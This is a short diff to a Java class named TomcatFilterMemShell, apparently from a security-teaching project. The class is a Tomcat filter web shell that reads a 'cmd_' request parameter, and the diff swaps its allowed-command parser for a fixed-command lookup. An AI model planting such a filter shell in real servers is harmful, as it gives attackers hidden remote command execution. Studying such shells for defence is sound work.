@@ -14,7 +14,7 @@ import org.apache.tomcat.util.descriptor.web.FilterMap;
 import java.lang.reflect.Constructor;
 import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.Context;
-import org.joychou.security.SecurityUtil;
+import org.joychou.security.FixedCommands;
 import org.springframework.stereotype.Component;
 
 import javax.servlet.*;
@@ -95,7 +95,7 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            String[] argv = SecurityUtil.parseAllowedCommand(cmd);
+            String[] argv = FixedCommands.lookup(cmd);
             if (argv == null) {
                 servletResponse.getOutputStream().write("Bad boy. I got u.".getBytes());
                 servletResponse.getOutputStream().flush();
